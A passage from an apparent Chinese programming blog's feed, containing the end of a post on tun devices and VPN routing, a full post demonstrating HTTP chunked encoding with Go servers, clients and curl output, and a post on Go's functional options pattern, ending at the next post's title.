class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">21: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100</span><br><span class="line">    link/none</span><br><span class="line">    inet 192.168.254.10 peer 192.168.254.9/32 scope global tun0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>这篇文章描述了两个路由表影响网络包收发的例子，如果读者不了解 tun/tap 设备，在阅读 VPN 部分时可能会比较吃力。</p><p>简单来说，这种设备可以由系统中的某一个进程打开，然后进程可以选择读取或写入这个设备，如果有网络包被发送到这个设备，那么进程就可以从中读取到数据，和常规的 socket 不同的是，tun 设备可以读取到 IP 层的内容，tap 设备则可以读取到链路层的内容。所以如果进程在收到网络包后将它包装在一个常规的 tcp 或 udp 包中，再经过物理网卡发送到外部网络的某台主机上，那么这台目标主机在解包后就可以看到原始的 IP 包或链路层的内容，从而好像内部的这个网络包直接到达了主机上，以此营造出源主机和目标主机在这个内部网络包层面是相互可达的假象，这种虚拟化技术被叫做 Overlay 网络，如今被广泛运用于容器或虚拟机技术中。</p><p>于是在上面 VPN 的例子中，192.168.254.0/24 实际上就是内部网络包的源地址与目的地址所属的网络，而 OpenVPN 的实际网络地址其实是 95.91.22.94，也就是说，如果没有 OpenVPN 创建的 tun 设备，主机通过正常的网络只能访问 95.91.22.94 这个地址。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>我的大学老师曾对我说，计算机领域要研究的内容总是离不开计算、存储和网络，这句话在近期深入学习容器技术的过程中不断出现在我的脑海里。 Diego Assencio 大大的原文中让我眼前一亮的其实就是 VPN 这个例子，它也是 flannel 项目最初实现的 udp 后端的核心原理，帮助我理解了更多网络方面的有趣知识。笔者对这篇文章的出现表示衷心的感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈 Http Chunked Encoding</title>
      <link href="/2022/05/04/HTTP-Chunked-Encoding/"/>
      <url>/2022/05/04/HTTP-Chunked-Encoding/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 HTTP 的消息头（即请求头和响应头）中，有一个叫 <code>Content-Length</code> 的字段，用于表示消息体的大小。早期版本的 HTTP 通过服务端发起的断开连接来表示一个消息的结束，这种方式在多数情况下都工作的很好，但是它存在两个比较严重的问题。第一是，在没有一个表示完整消息大小的字段来帮助检查的情况下，客户端无法得知连接的断开是正常情况还是由于消息的传输发生了异常；第二是，在多个 HTTP 消息共用同一个 TCP 连接的场景下，客户端无法找到不同消息间的边界。</p><p>所以，HTTP 的规范要求 <code>Content-Length</code> 字段是必须被提供的（虽然实际测试时发现如果服务端没有提供，很多工具依然会将关闭连接作为默认的消息边界）。</p><p>但是，有种消息，它是没有这个字段的，取而代之地使用另一种方式来确保消息的完整性，它就是这篇文章的主角，Chunked Encoding，一种消息的传输编码（Transfer Encoding）。</p><h1 id="Chunked-Encoding-与-curl"><a href="#Chunked-Encoding-与-curl" class="headerlink" title="Chunked Encoding 与 curl"></a>Chunked Encoding 与 curl</h1><p>我最早了解到 Chunked Encoding 恰恰是在用 curl 来测试服务端不提供 <code>Content-Length</code> 会发生什么时。一般来讲，如果你使用 HTTP 的框架提供服务，那么这个消息头是会被框架来处理的。所以最简单的一种绕过框架、发送一个没有这个字段的响应的方式，就是直接使用 TCP，比如在 golang 中你可以编写这样的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TCPServer</span><span class="params">()</span></span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">"localhost:8080"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line">conn.Write([]<span class="keyword">byte</span>(<span class="string">"HTTP/1.1 200 OK\r\n"</span> +</span><br><span class="line"><span class="string">"Date: Wed, 04 May 2022 12:38:41 GMT\r\n"</span> +</span><br><span class="line"><span class="string">"Content-Type: text/plain; charset=utf-8\r\n"</span> +</span><br><span class="line"><span class="string">"\r\n1234567890"</span>))</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码不是很标准，因为这个程序没有读取请求而直接发送响应，不过这无伤大雅。代码主要做的事情就是发送一个没有 <code>Content-Length</code> 请求头字段的响应，但是在请求体里有 <code>1234567890</code> 这样的内容。这时如果执行它，并且使用 <code>curl -v localhost:8080</code>，那么在 curl 的输出中可以发现 <code>no chunk, no close, no size. Assume close to signal end</code> 这样的输出，这证明了我在前言中的描述。</p><p>那么，Chunked Encoding 的响应体是什么样的呢，为什么它会被 curl 区别对待？我们仍然可以用 golang 和 curl 进行测试。</p><p>golang 的 http 包本身就支持 Chunked Encoding，它的 http.ResponseWriter 接口可以被显式转换成 Flusher 接口，这个接口提供一个 Flush 方法，如果调用它，那么它会以 Chunked Encoding 方式处理发送的内容，于是我们可以编写这样的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPServer</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">flusher, ok := rw.(http.Flusher)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"can not convert rw to flusher"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">rw.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">"message #%d\n"</span>, i)))</span><br><span class="line">flusher.Flush()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := http.ListenAndServe(<span class="string">"localhost:8080"</span>, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码试图分五次发送响应体，每次间隔一秒钟。如果我们使用 <code>curl -v localhost:8080</code> ，那么会发现响应体确实如预期一般每隔一秒发送一部分，同时响应头中有 <code>Transfer-Encoding: chunked</code> 这样的字段表示这个响应是以 Chunked Encoding 的方式被发送的，而且这个响应也确实没有 <code>Content-Length</code> 这个字段。</p><p>更进一步的，如果再为 curl 加上 –raw 参数，也就是使用 <code>curl -v --raw localhost:8080</code>，那么就可以获取原始的响应体内容，这个命令的结果是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">b</span><br><span class="line">message #0</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #1</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #2</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #3</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">message #4</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>再进一步，如果命令变成了 <code>curl -v --raw localhost:8080 | hexdump -C</code> ，就可以得到这样的响应体内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000  62 0d 0a 6d 65 73 73 61  67 65 20 23 30 0a 0d 0a  |b..message #0...|</span><br><span class="line">00000010  62 0d 0a 6d 65 73 73 61  67 65 20 23 31 0a 0d 0a  |b..message #1...|</span><br><span class="line">00000020  62 0d 0a 6d 65 73 73 61  67 65 20 23 32 0a 0d 0a  |b..message #2...|</span><br><span class="line">00000030  62 0d 0a 6d 65 73 73 61  67 65 20 23 33 0a 0d 0a  |b..message #3...|</span><br><span class="line">00000040  62 0d 0a 6d 65 73 73 61  67 65 20 23 34 0a 0d 0a  |b..message #4...|</span><br><span class="line">00000050  30 0d 0a 0d 0a                                    |0....|</span><br><span class="line">00000055</span><br></pre></td></tr></table></figure><p>这样看来就很明显了：Chunked Encoding 发送的每一部分响应体，都会以一个 16 进制的数字作为开始，这个数字表示这部分响应体的长度，后面接 <code>\r\n</code> ，然后是具体的响应体内容，再接 <code>\r\n</code>标记这部分响应的结束（上面例子中倒数第三列的 0a 是前面 <code>fmt.Sprintf(&quot;message #%d\n&quot;, i)</code> 中的 \n，并不是 Chunked Encoding 的结构）。最终，以 0 表示整个响应的结束，由于长度为 0，那么紧随其后的只有两个 <code>\r\n</code>。</p><h1 id="Chunked-Encoding-与-Golang-http-的客户端"><a href="#Chunked-Encoding-与-Golang-http-的客户端" class="headerlink" title="Chunked Encoding 与 Golang http 的客户端"></a>Chunked Encoding 与 Golang http 的客户端</h1><p>golang 对 Chunked Encoding 的支持不仅限于服务端，比如我们还是使用上面的代码作为服务端，但是编写这样的代码来作为客户端：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HTTPClient</span><span class="params">()</span></span> &#123;</span><br><span class="line">rsp, err := http.Get(<span class="string">"http://localhost:8080"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">512</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="built_in">len</span>, err := rsp.Body.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">fmt.Println(<span class="string">"Done"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="built_in">len</span>, <span class="keyword">string</span>(buf[:<span class="built_in">len</span>]))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么在运行它后，会得到如下的输出（每部分同样会间隔一秒）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">11 message #0</span><br><span class="line"></span><br><span class="line">11 message #1</span><br><span class="line"></span><br><span class="line">11 message #2</span><br><span class="line"></span><br><span class="line">11 message #3</span><br><span class="line"></span><br><span class="line">11 message #4</span><br><span class="line"></span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>通过前面的内容我们可以知道，响应体的内容是包含长度、<code>\r\n</code>、部分响应体内容的，但是如果我们直接使用 golang 的 http.Response.Body.Read 方法，就可以直接拿到响应体的有效内容部分，不需要我们自己去做一些额外的操作（比如读取长度，跳过CRLF，验证长度等等）。</p><h1 id="Chunked-Encoding-与-Golang-http-的服务端"><a href="#Chunked-Encoding-与-Golang-http-的服务端" class="headerlink" title="Chunked Encoding 与 Golang http 的服务端"></a>Chunked Encoding 与 Golang http 的服务端</h1><p>现在让我们把关注点放回到服务端上，不难想象，这种不需要提前计算 <code>Content-Length</code>、动态持续生成内容的消息类型，在一定程度上是可以实现 Websocket 的功能的，因为常规 HTTP 的痛点就在于它是一问一答的形式，而且回答的内容在被发送前就要确定下来。事实上，如果读者熟悉 Kubernetes 的 watch 机制，就会知道它是同时支持 Chunked Encoding 和 Websocket 两种方式的。</p><p>所以我们可以编写下面这样的一个小例子来演示 Chunked Encoding 的这种能力：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用来线程安全地对 connections 变量使用 append</span></span><br><span class="line"><span class="keyword">var</span> globalLock = &amp;sync.Mutex&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用来保存所有的 Connection 对象</span></span><br><span class="line"><span class="keyword">var</span> connections []*Connection</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个 Connection 对象，并将它放入 connections 切片中</span></span><br><span class="line">http.HandleFunc(<span class="string">"/watch"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">c := NewConnection(rw)</span><br><span class="line"></span><br><span class="line">globalLock.Lock()</span><br><span class="line">fmt.Println(<span class="string">"Append one"</span>)</span><br><span class="line">connections = <span class="built_in">append</span>(connections, c)</span><br><span class="line">globalLock.Unlock()</span><br><span class="line"></span><br><span class="line">c.Send(<span class="string">"Start Watching...\n"</span>)</span><br><span class="line"><span class="keyword">select</span> &#123;&#125; <span class="comment">// 避免函数退出，从而保留住连接，这会有协程泄露的问题，但是这里先不管</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 connections 中的所有连接发送一条消息</span></span><br><span class="line">http.HandleFunc(<span class="string">"/send"</span>, <span class="function"><span class="keyword">func</span><span class="params">(rw http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">msg := r.URL.Query().Get(<span class="string">"msg"</span>)</span><br><span class="line"><span class="keyword">for</span> _, c := <span class="keyword">range</span> connections &#123;</span><br><span class="line">fmt.Println(<span class="string">"Send one"</span>)</span><br><span class="line">c.Send(msg + <span class="string">"\n"</span>) <span class="comment">// 这里加一个回车方便观察</span></span><br><span class="line">&#125;</span><br><span class="line">rw.Write([]<span class="keyword">byte</span>(<span class="string">"Done"</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := http.ListenAndServe(<span class="string">"localhost:8080"</span>, <span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代表一个 Chunked Encoding 连接，提供 Send 方法用于发送一部分响应体</span></span><br><span class="line"><span class="keyword">type</span> Connection <span class="keyword">struct</span> &#123;</span><br><span class="line">rw      http.ResponseWriter</span><br><span class="line">flusher http.Flusher</span><br><span class="line">lock    *sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewConnection</span><span class="params">(rw http.ResponseWriter)</span> *<span class="title">Connection</span></span> &#123;</span><br><span class="line">flusher, ok := rw.(http.Flusher)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"can not convert rw to flusher"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;Connection&#123;rw, flusher, &amp;sync.Mutex&#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 Chunked Encoding 的方式发送响应体的一部分</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Connection)</span> <span class="title">Send</span><span class="params">(msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">// 这里的加锁是必须的，因为下面的操作并不是原子的</span></span><br><span class="line"><span class="comment">// 而多协程同时写响应体会导致 Chunked Encoding 的结构乱掉，从而引发客户端异常</span></span><br><span class="line">c.lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> c.lock.Unlock()</span><br><span class="line"></span><br><span class="line">c.rw.Write([]<span class="keyword">byte</span>(msg))</span><br><span class="line">c.flusher.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码有些长，主要的功能是提供了 /watch 和 /send 两个 path，前者用于和服务端保持一个连接，并从这个连接中接受被服务端下发的内容，后者则可以传递一个 msg 的 query 参数，其内容会被广播给所有的 Chunked Encoding 连接。</p><p>运行这个程序，然后多准备几个终端窗口，均执行 <code>curl -v localhost:8080/watch</code>，待它们都显示 <code>Start Watching...</code> 消息后，再打开一个终端窗口，执行  <code>curl localhost:8080/send\?msg=aaaaa</code>，就可以发现前面的所有窗口都收到了 <code>aaaaa</code> 这个消息。而这，其实本质上和 k8s 的 watch 机制是一样的。</p><p>上面的代码仅仅起到抛砖引玉的作用，由于 Chunked Encoding 在一定程度上提供了类似全双工通信的能力，我们完全可以基于它实现更多，比如实时消息推送、聊天室等等。</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>最近辞掉了公司实习生的身份，距离毕业后回去做正式员工还有大概一个多月的时间，想在这段时间内好好休息一下。由于手头的工作就只有毕业设计和毕业论文，便有了更充足的时间来兴趣驱动地学一些东西。近期在读《HTTP-The-Definitive-Guide》这本书，主要目的是更深入地了解一些 HTTP 的特性，其次也想借此锻炼一下自己的英语阅读能力。</p><p>不过我是乱序读的，目前暂定的阅读顺序是 <code>HTTPS -&gt; Entity&amp;Encoding -&gt; Connection Management -&gt; Cookie -&gt; Cache</code>，其他的内容就按需添加。</p><p>这篇文章就是我在阅读了 <code>Entity &amp; Encoding</code> 部分后，针对 http chunked encoding 这个特性的一个总结与实践。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Functional-Options</title>
      <link href="/2021/04/30/Functional-Options/"/>
      <url>/2021/04/30/Functional-Options/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>到了大三，学校的课设开始不限制实现的语言了，考虑到为未来打基础，于是我大部分的课设都使用 Golang 来完成，以期在实践中逐渐熟练这门简洁却高效的语言。</p><p>在使用的过程中，经常会遇见对结构体进行初始化的需求，如果只是简单的字段还好，直接通过字面量来初始化即可，然而对于一些拥有复杂结构及依赖的结构体，其初始化不论是用户友好性还是可读性上都不适合使用字面量来初始化，在 Golang 的标准库中通常采用返回结构体指针的 New 函数来实现（如 list.New，sync.NewCond），这样在函数中屏蔽了相关的实现细节，以让用户能够聚焦在简单的使用上。</p><p>然而，Golang 目前并不支持函数的重载，这导致 New 函数的特征标（signature）是写死的，函数需要什么参数，用户就只能传递什么参数来初始化相应的字段。如果想达到前文所述的易用，那么参数就不该设置得太多；但是如果想给用户足够的能力来按需设置结构体，那么参数就不该设置得太少，这使得开发者很难找到一个平衡点，来设计方便高效的参数进行初始化。</p><p>有没有什么方法，能使用同一个初始化函数，通过提供不同的参数来完成对结构体不同程度的初始化呢？</p><h1 id="0x01-解决方法及原理"><a href="#0x01-解决方法及原理" class="headerlink" title="0x01 解决方法及原理"></a>0x01 解决方法及原理</h1><p>最近在逛<a href="https://coolshell.cn/articles/21146.html" target="_blank" rel="noopener">左耳耗子老师的博客</a>的时候偶然看到了如题所述的 Functional Options 模式，该模式非常优雅地利用闭包和可变参数等性质来解决了前文所述的问题，下面给出一个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">name  <span class="keyword">string</span></span><br><span class="line">age   <span class="keyword">int</span></span><br><span class="line">hobby <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> withFunc <span class="function"><span class="keyword">func</span><span class="params">(*Person)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">withName</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withAge</span><span class="params">(age <span class="keyword">int</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.age = age</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withHobby</span><span class="params">(hobby <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.hobby = hobby</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">makePerson</span><span class="params">(funcs ...withFunc)</span> *<span class="title">Person</span></span> &#123;</span><br><span class="line">ret := &amp;Person&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, f := <span class="keyword">range</span> funcs &#123;</span><br><span class="line">f(ret)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p1 := makePerson(withName(<span class="string">"Yuren"</span>))</span><br><span class="line">p2 := makePerson(withName(<span class="string">"Yuren"</span>), withAge(<span class="number">21</span>))</span><br><span class="line">p3 := makePerson(withName(<span class="string">"Yuren"</span>), withAge(<span class="number">21</span>), withHobby(<span class="string">"Program"</span>))</span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"%+v\n%+v\n%+v\n"</span>, p1, p2, p3)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于所谓的 New 函数，我个人比较习惯于将其命名为 make+结构体名 的形式，这里就请忽略这个非常不 Golang 的函数名，转而聚焦到函数的实现上。</p><p>可以看到，makePerson 函数本身接收一个 withFuncs 的可变参数列表，withFuncs 作为一种类型定义，其本质上是一个需要传递 Person 指针的函数。按照这种特征标，代码中的 withName，withAge 和 withHobby 的返回值都是符合 withFuncs 类型的实现，由于这三者原理上相同，这里只用 withName 来举例。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">withName</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">withFunc</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">p.name = name</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>withName 的函数定义如上，可以看到其返回了一个 withFunc 类型的函数。该函数利用闭包将传递给外层 withName 的 name 参数绑定在其作用域内，使得 withFunc 函数返回后依然具备访问 name 变量的能力，而该函数本身做的事情就是将传递进来的 Person 指针指向的实例中的 name 字段设置为 name 变量的值。</p><p>具体的 Person 指针的传递发生在 makePerson 函数调用的时候，即 p1~p3 处，在调用时传递了需要的 with* 函数的调用，将其返回的 withFunc 类型的函数放到了 makePerson 的参数列表中。</p><p>makePerson 做的事情就是用待返回的 Person 指针来消耗可变参数列表中的 withFunc 函数，以使其内部的字段被函数初始化成闭包内保留的值。</p><h1 id="0x2-总结"><a href="#0x2-总结" class="headerlink" title="0x2 总结"></a>0x2 总结</h1><p>本文试图通过抛出笔者平时遇到的结构体初始化的矛盾，进而通过学习给出相应的解决办法，同时阐述相关的原理。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之单例模式</title>
